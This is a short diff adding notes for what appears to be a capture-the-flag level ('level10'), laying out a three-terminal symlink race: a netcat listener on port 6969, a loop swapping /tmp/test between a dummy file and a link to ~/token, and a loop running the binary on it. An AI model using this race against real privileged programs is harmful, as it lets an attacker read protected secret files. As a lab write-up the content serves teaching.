@@ -1,0 +1,20 @@
+
+- analyse level10 with objdump and see that we need to listen on 6969
+
+- open 3 terminal in level10
+
+Window 1:
+
+nc -lk 6969
+
+window 2:
+
+while true; do echo "test" > /tmp/test
+rm /tmp/test;
+ln -s ~/token /tmp/test;
+rm /tmp/test;
+done
+
+Window 3:
+
+while true ; do ./level10 /tmp/test 0; done
